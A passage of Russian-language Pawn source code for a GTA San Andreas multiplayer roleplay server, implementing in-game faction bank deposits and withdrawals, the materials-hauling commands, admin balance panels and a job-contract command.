			if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fVagos] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Vagos: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Vagos %i вирт", PTEMP[playerid][pName], params[0]);
		}
	case 17:
		{
			if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fAztek] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Aztec: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Aztec %i вирт", PTEMP[playerid][pName], params[0]);
		}
	case 18:
		{
			if(PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " У вас нет столько денег!"); return true; }
			FracBank[0][fRifa] += params[0];
			PTEMP[playerid][pCash] -= params[0];
			format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Rifa: %i вирт", params[0]);
			SCM(playerid, 0x6495EDFF, YCMDstr);
			printf("Игрок %s положил на счёт Rifa %i вирт", PTEMP[playerid][pName], params[0]);
		}
	}
	return true;
}
CMD:mafiabalance(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	switch(PTEMP[playerid][pMember])
	{
	case 6: format(YCMDstr, sizeof(YCMDstr), " В банке мафии Yakuza: %i вирт", MafiaBank[0][nYakuza]);
	case 14: format(YCMDstr, sizeof(YCMDstr), " В банке Русской мафии: %i вирт", MafiaBank[0][nRm]);
	case 5: format(YCMDstr, sizeof(YCMDstr), " В банке мафии LCN: %i вирт", MafiaBank[0][nLcn]);
	default:return true;
	}
	SCM(playerid, 0x6495EDFF, YCMDstr);
	return true;
}
CMD:mafiawithdraw(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLeader] == 6 || PTEMP[playerid][pLeader] == 14 || PTEMP[playerid][pLeader] == 5)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /mafiawithdraw   или   /mwithdraw [сумма]");
	if(params[0] < 1) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
	if(PTEMP[playerid][pMember] == 6 && PTEMP[playerid][pRank] >= 10)
	{
		if(MafiaBank[0][nYakuza] <= 0) { SCM(playerid, COLOR_GREY, " В банке мафии Yakuza нет денег"); return true; }
		if(MafiaBank[0][nYakuza] < params[0]) { SCM(playerid, COLOR_GREY, " В банке мафии Yakuza нет столько денег"); return true; }
		if((limitmafia[0] + params[0]) > 500000) return SendMes(playerid, COLOR_GREY, " В день лимит снятия 500 000. Вы можете ещё снять %i вирт", (500000 - limitmafia[0]));
		MafiaBank[0][nYakuza] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		limitmafia[0] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка мафии Yakuza: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял со счёта Yakuza %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 14 && PTEMP[playerid][pRank] >= 10)
	{
		if(MafiaBank[0][nRm] <= 0) { SCM(playerid, COLOR_GREY, "В банке Русской мафии нет денег"); return true; }
		if(MafiaBank[0][nRm] < params[0]) { SCM(playerid, COLOR_GREY, "В банке Русской мафии нет столько денег"); return true; }
		if((limitmafia[1] + params[0]) > 500000) return SendMes(playerid, COLOR_GREY, " В день лимит снятия 500 000. Вы можете ещё снять %i вирт", (500000 - limitmafia[1]));
		MafiaBank[0][nRm] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		limitmafia[1] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка Русской мафии: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял со счёта Russian Mafia %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 5 && PTEMP[playerid][pRank] >= 10)
	{
		if(MafiaBank[0][nLcn] <= 0) { SCM(playerid, COLOR_GREY, "В банке мафии LCN нет денег"); return true; }
		if(MafiaBank[0][nLcn] < params[0]) { SCM(playerid, COLOR_GREY, "В банке мафии LCN нет столько денег"); return true; }
        if((limitmafia[0] + params[2]) > 500000) return SendMes(playerid, COLOR_GREY, " В день лимит снятия 500 000. Вы можете ещё снять %i вирт", (500000 - limitmafia[2]));
		MafiaBank[0][nLcn] -= params[0];
		PTEMP[playerid][pCash] +=params[0];
		limitmafia[2] += params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы сняли с банка мафии LCN: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s снял со счёта LCN %i вирт", PTEMP[playerid][pName], params[0]);
	}
	return true;
}
CMD:mafiabank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pLeader] == 6 || PTEMP[playerid][pLeader] == 14 || PTEMP[playerid][pLeader] == 5)
	if(sscanf(params, "d", params[0])) return SCM(playerid, -1, " Введите: /mafiabank [количество]");
	if(params[0] < 1 || PTEMP[playerid][pCash] < params[0]) { SCM(playerid, COLOR_GREY, " Неправильный количество денег!"); return true; }
	if(PTEMP[playerid][pMember] == 6 && PTEMP[playerid][pRank] > 6)
	{
		MafiaBank[0][nYakuza] += params[0];
		PTEMP[playerid][pCash] -=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк мафии Yakuza: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s положил на счёт Yakuza %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 14 && PTEMP[playerid][pRank] > 6)
	{
		MafiaBank[0][nRm] += params[0];
		PTEMP[playerid][pCash] -=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк Русской мафии: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s положил на счёт Russian Mafia %i вирт", PTEMP[playerid][pName], params[0]);
	}
	else if(PTEMP[playerid][pMember] == 5 && PTEMP[playerid][pRank] > 6)
	{
		MafiaBank[0][nLcn] += params[0];
		PTEMP[playerid][pCash] -=params[0];
		format(YCMDstr, sizeof(YCMDstr), " Вы положили в банк мафии LCN: %i вирт", params[0]);
		SCM(playerid, 0x6495EDFF, YCMDstr);
		printf("Игрок %s положил на счёт LCN %i вирт", PTEMP[playerid][pName], params[0]);
	}
	return true;
}
CMD:materials(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new x_nr[40];
	if(IsPlayerConnected(playerid))
	{
		if(sscanf(params, "s[64]", x_nr))
		{
			SCM(playerid, -1, " Введите: /materials [значение]");
			return true;
		}
		if(strcmp(x_nr, "buy",true) == 0)
		{
			if(IsAMafia(playerid) && PTEMP[playerid][pRank] >= 9)
			{
				format(string, 128, "Вы действительно хотите купить 50000 материалов,\nв общак банды за 500000 вирт?");
				ShowPlayerDialogEx(playerid,9298,DIALOG_STYLE_MSGBOX, "Покупка материалов",string, "Да", "Отмена");
				return true;
			}
		}
		else if(strcmp(x_nr, "load",true) == 0)
		{
			new tmpcar = GetNearestVehicle(playerid);
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 482) return SCM(playerid,COLOR_GREY, " Вы не в фургоне!");
			if(!IsATerra(playerid)) return SCM(playerid, COLOR_GRAD1, " Вы должны находится на своей базе!");
			if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY, " Вы не бандит");
			if(ballasmatbi <= 0) return SCM(playerid, COLOR_GREY, " На складе недостаточно материалов");
			if(PTEMP[playerid][pRank] < 8)return SCM(playerid,COLOR_GRAD1," Доступно только с 8 ранга!");
			switch(PTEMP[playerid][pMember])
			{
			case 12:
				{
					if(Furi[tmpcar-matsfura[0]][gBallas] > 0 && Furi[tmpcar-matsfura[0]][gBallas] < maxMats[gBallas] && ballasmatbi > maxMats[gBallas])
					{
						kolvovfure = maxMats[gBallas] - Furi[tmpcar-matsfura[0]][gBallas];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfura[0]][gBallas] += kolvovfure;
						ballasmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfura[0]][gBallas] == maxMats[gBallas]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfura[0]][gBallas] == 0 && ballasmatbi > maxMats[gBallas])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], maxMats[gBallas]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfura[0]][gBallas] += maxMats[gBallas];
						ballasmatbi -= maxMats[gBallas];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(ballasmatbi < maxMats[gBallas])
					{
						kolvovsklade = ballasmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfura[0]][gBallas] += kolvovsklade;
						ballasmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 13:
				{
					if(Furi[tmpcar-matsfuravagos[0]][gVagos] > 0 && Furi[tmpcar-matsfuravagos[0]][gVagos] < maxMats[gVagos] && vagosmatbi > maxMats[gVagos])
					{
						kolvovfure = maxMats[gVagos] - Furi[tmpcar-matsfuravagos[0]][gVagos];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuravagos[0]][gVagos] += kolvovfure;
						vagosmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfuravagos[0]][gVagos] == maxMats[gVagos]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfuravagos[0]][gVagos] == 0 && vagosmatbi > maxMats[gVagos])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], maxMats[gVagos]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuravagos[0]][gVagos] += maxMats[gVagos];
						vagosmatbi -= maxMats[gVagos];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(vagosmatbi < maxMats[gVagos])
					{
						kolvovsklade = vagosmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuravagos[0]][gVagos] += kolvovsklade;
						vagosmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 15:
				{
					if(Furi[tmpcar-matsfuragrove[0]][gGrove] > 0 && Furi[tmpcar-matsfuragrove[0]][gGrove] < maxMats[gGrove] && groovmatbi > maxMats[gGrove])
					{
						kolvovfure = maxMats[gGrove] - Furi[tmpcar-matsfuragrove[0]][gGrove];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuragrove[0]][gGrove] += kolvovfure;
						groovmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfuragrove[0]][gGrove] == maxMats[gGrove]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfuragrove[0]][gGrove] == 0 && groovmatbi > maxMats[gGrove])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], maxMats[gGrove]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuragrove[0]][gGrove] += maxMats[gGrove];
						groovmatbi -= maxMats[gGrove];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(groovmatbi < maxMats[gGrove])
					{
						kolvovsklade = groovmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuragrove[0]][gGrove] += kolvovsklade;
						groovmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 17:
				{
					if(Furi[tmpcar-matsfuraactek[0]][gAztek] > 0 && Furi[tmpcar-matsfuraactek[0]][gAztek] < maxMats[gAztek] && aztekmatbi > maxMats[gAztek])
					{
						kolvovfure = maxMats[gAztek] - Furi[tmpcar-matsfuraactek[0]][gAztek];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuraactek[0]][gAztek] += kolvovfure;
						aztekmatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfuraactek[0]][gAztek] == maxMats[gAztek]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfuraactek[0]][gAztek] == 0 && aztekmatbi > maxMats[gAztek])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], maxMats[gAztek]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuraactek[0]][gAztek] += maxMats[gAztek];
						aztekmatbi -= maxMats[gAztek];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(aztekmatbi < maxMats[gAztek])
					{
						kolvovsklade = aztekmatbi;
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfuraactek[0]][gAztek] += kolvovsklade;
						aztekmatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			case 18:
				{
					if(Furi[tmpcar-matsfurarifa[0]][gRifa] > 0 && Furi[tmpcar-matsfurarifa[0]][gRifa] < maxMats[gRifa] && rifamatbi > maxMats[gRifa])
					{
						kolvovfure = maxMats[gRifa] - Furi[tmpcar-matsfurarifa[0]][gRifa];
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovfure);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfurarifa[0]][gRifa] += kolvovfure;
						rifamatbi -= kolvovfure;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(Furi[tmpcar-matsfurarifa[0]][gRifa] == maxMats[gRifa]) return SCM(playerid, COLOR_GRAD1, " Фургон полн");
					else if(Furi[tmpcar-matsfurarifa[0]][gRifa] == 0 && rifamatbi > maxMats[gRifa])
					{
						format(string, 128, " %s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], maxMats[gRifa]);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfurarifa[0]][gRifa] += maxMats[gRifa];
						rifamatbi -= maxMats[gRifa];
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
					else if(rifamatbi < maxMats[gRifa])
					{
						kolvovsklade = aztekmatbi;
						format(string, 128, "% s загрузил(а) %i материалов в фургон", PTEMP[playerid][pName], kolvovsklade);
						ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						Furi[tmpcar-matsfurarifa[0]][gRifa] += kolvovsklade;
						rifamatbi -= kolvovsklade;
						SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
					}
				}
			}
		}
		else if(strcmp(x_nr, "put",true) == 0)
		{
			new tmpcar = GetNearestVehicle(playerid);
			if(GetVehicleModel(GetNearestVehicle(playerid)) != 482) return SCM(playerid,COLOR_GREY, " Вы не в фургоне/Около фургона!");
			switch(PTEMP[playerid][pMember])
			{
			case 12:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы в фургоне: %i/%i", Furi[tmpcar-matsfura[0]][gBallas], maxMats[gBallas]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfura[0]][gBallas] >= maxMats[gBallas]) return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfura[0]][gBallas] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы в фургоне: %i/%i", Furi[tmpcar-matsfura[0]][gBallas], maxMats[gBallas]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 13:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuravagos[0]][gVagos], maxMats[gVagos]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfuravagos[0]][gVagos] >= maxMats[gVagos]) return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfuravagos[0]][gVagos] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuravagos[0]][gVagos], maxMats[gVagos]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 15:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuragrove[0]][gGrove], maxMats[gGrove]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfuragrove[0]][gGrove] >= maxMats[gGrove]) return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfuragrove[0]][gGrove] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuragrove[0]][gGrove], maxMats[gGrove]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 17:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuraactek[0]][gAztek], maxMats[gAztek]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfuraactek[0]][gAztek] >= maxMats[gAztek])return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfuraactek[0]][gAztek] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfuraactek[0]][gAztek], maxMats[gAztek]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			case 18:
				{
					if(usemats[playerid] == 0)
					{
						SCM(playerid,COLOR_GRAD1, " У вас нет материалов с собой");
						format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfurarifa[0]][gRifa], maxMats[gRifa]);
						SCM(playerid, TEAM_GROVE_COLOR, string);
						return true;
					}
					if(Furi[tmpcar-matsfurarifa[0]][gRifa] >= maxMats[gRifa])return SCM(playerid,COLOR_GRAD1, " Фургон заполнен");
					SCM(playerid, -1, " Вы положили в фургон 250 материалов");
					Furi[tmpcar-matsfurarifa[0]][gRifa] += 250;
					usemats[playerid] = 0;
					RemovePlayerAttachedObject(playerid, 1);
					format(string, 128, " Материалы: %i/%i", Furi[tmpcar-matsfurarifa[0]][gRifa], maxMats[gRifa]);
					SCM(playerid, TEAM_GROVE_COLOR, string);
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_NONE);
				}
			}
		}
		else if(strcmp(x_nr, "get",true) == 0)
		{
			if(IsAGang(playerid))
			{
				if(PlayerToPoint(10.0,playerid,-1290.9072,501.4489,11.1953))
				{
					if(armmatsf < 250)return SCM(playerid,COLOR_GRAD1, " Склад армии пуст");
					if(usemats[playerid] != 0) return SCM(playerid,COLOR_GRAD1, " Вы не можете взять больше");
					SCM(playerid, 0x6495EDFF, " Вы взяли 250 материалов со склада армии");
					SCM(playerid, -1, " Несите ящик в грузовик, используйте /materials put, чтобы положить материалы в фургон");
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
					usemats[playerid] = 1;
					armmatsf -= 250;
				}
				if(PlayerToPoint(2.0,playerid,2729.3267,-2451.5051,17.5937))
				{
					if(lsamatbi < 250)return SCM(playerid,COLOR_GRAD1, " Склад армии пуст");
					if(usemats[playerid] != 0) return SCM(playerid,COLOR_GRAD1, " Вы не можете взять больше");
					SCM(playerid, 0x6495EDFF, " Вы взяли 250 материалов со склада армии");
					SCM(playerid, -1, " Несите ящик в грузовик, используйте /materials put, чтобы положить материалы в фургон");
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
					usemats[playerid] = 2;
					lsamatbi -= 250;
				}
				if(PlayerToPoint(10.0,playerid,316.8127,-167.5395,999.5938) && GetPlayerVirtualWorld(playerid) == 0)
				{
					if(armmatbi < 250)return SCM(playerid,COLOR_GRAD1, " Склад армии пуст");
					if(usemats[playerid] != 0) return SCM(playerid,COLOR_GRAD1, " Вы не можете взять больше");
					SCM(playerid, 0x6495EDFF, " Вы взяли 250 материалов со склада армии");
					SCM(playerid, -1, " Несите ящик в грузовик, используйте /materials put, чтобы положить материалы в фургон");
					SetPlayerSpecialAction (playerid, SPECIAL_ACTION_CARRY);
					SetPlayerAttachedObject(playerid, 1 , 2358, 1,0.11,0.36,0.0,0.0,90.0);
					usemats[playerid] = 3;
					armmatbi -= 250;
					new strings1[50];
					format(strings1,sizeof(strings1), "{33AA33}Склад армии ЛВ: {FFFFFF}%i", armmatbi);
					UpdateDynamic3DTextLabelText(LvaLable, 0xFFFF00FF, strings1);
				}
			}
		}
	}
	return true;
}
CMD:gettax(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMember] == 7)
	{
		format(YCMDstr, sizeof(YCMDstr), " В казне: %i вирт", FracBank[0][fKazna]);
		SCM(playerid, -1, YCMDstr);
	}
	return true;
}
CMD:apanel(playerid, params[])
{
	if(!dostup[playerid]) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	new stringer[1024];
	format(string, 48, "(1) LCN\t\t\t\t %i $\n", MafiaBank[0][nLcn]); strcat(stringer, string);
	format(string, 48, "(2) Yakuza\t\t\t %i $\n", MafiaBank[0][nYakuza]); strcat(stringer, string);
	format(string, 48, "(3) Мэрия\t\t\t %i $\n", FracBank[0][fKazna]); strcat(stringer, string);
	format(string, 48, "(4) SF News\t\t\t %i $\n", FracBank[0][fSfnews]); strcat(stringer, string);
	format(string, 48, "(5) Ballas\t\t\t %i $\n", FracBank[0][fBallas]); strcat(stringer, string);
	format(string, 48, "(6) Vagos\t\t\t %i $\n", FracBank[0][fVagos]); strcat(stringer, string);
	format(string, 48, "(7) RM\t\t\t\t %i $\n",MafiaBank[0][nRm]); strcat(stringer, string);
	format(string, 48, "(7) Grove\t\t\t %i $\n",FracBank[0][fGrove]); strcat(stringer, string);
	format(string, 48, "(8) LS News\t\t\t %i $\n",FracBank[0][fLsnews]); strcat(stringer, string);
	format(string, 48, "(9) Aztec\t\t\t %i $\n",FracBank[0][fAztek]); strcat(stringer, string);
	format(string, 48, "(10) Rifa\t\t\t %i $\n",FracBank[0][fRifa]); strcat(stringer, string);
	format(string, 48, "(12) LV News\t\t\t %i $\n",FracBank[0][fLvnews]); strcat(stringer, string);
	format(string, 48, "(13) Hell's Angels MC\t\t %i $\n",FracBank[0][fHamc]); strcat(stringer, string);
	format(string, 48, "(14) Warlocks MC\t\t %i $\n",FracBank[0][fWmc]); strcat(stringer, string);
	ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX,"Админ панель",stringer,"Готово", "Отмена");
	return true;
}
CMD:awarehouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	format(string, 128, "На складе Зоны 51: %i/300000 материалов", armmatbi);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе армии Авианосца: %i/300000 материалов", armmatsf);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе FBI %i материалов", fbimats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе LSPD %i/50000 материалов", lspdmatbi);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе SFPD %i/50000 материалов", sfpdmats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе LVPD %i/50000 материалов", lvpdmats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе мафии Якудза %i/100000 материалов", yakuzamats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе мафии LCN %i/100000 материалов", lcnmats);
	SCM(playerid, COLOR_GRAD1, string);
	format(string, 128, "На складе Русской Мафии %i/100000 материалов", rmmats);
	SCM(playerid, COLOR_GRAD1, string);
	return true;
}
CMD:payday(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	PayDay();
	printf("Администратор %s включил PayDay", Name(playerid));
	return true;
}
CMD:gcontract(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new giveplayerid;
	if(Prorab[playerid] == false) return SCM(playerid,COLOR_RED, " Вы должны переодеться");
	if(!IsPlayerInRangeOfPoint(playerid,10.0,2127.5701,-2275.1938,20.6719)) return SCM(playerid,COLOR_GREY, " Вы должны находиться на заводе");
	if(sscanf(params, "u", giveplayerid)) return SCM(playerid,-1, " Введите: /gcontract [ID].");
	if(giveplayerid == playerid) return SCM(playerid,COLOR_GREY, " Вы указали свой ID");
	if(Prorab[giveplayerid] == true) return SCM(playerid,COLOR_GREY, " Вы не можете заключать контракт с прорабом");
	if(Works[giveplayerid] == true) return SCM(playerid,COLOR_GREY, " Этот игрок уже работает.");
	if(!IsPlayerConnected(giveplayerid)) return SCM(playerid,COLOR_GREY, " Игрок не в сети");
	if(!ProxDetectorS(5.0, playerid, giveplayerid)) return SCM(playerid,COLOR_GREY, " Ошибка. Игрок должен находиться рядом с вами");
	if(JobOffer[giveplayerid] == playerid) return SCM(playerid,COLOR_GREY, " Вы уже предложили игроку контракт.");
	JobOffer[giveplayerid] = playerid;
	format(string, 128, " Вы предложили %s работать под вашим начальством.",PTEMP[giveplayerid][pName]);
	SCM(playerid, 0x6495EDFF, string);
	format(string, 128, " %s предложил работать под его начальством (( (/ac)cept gontract ))", PTEMP[playerid][pName]);
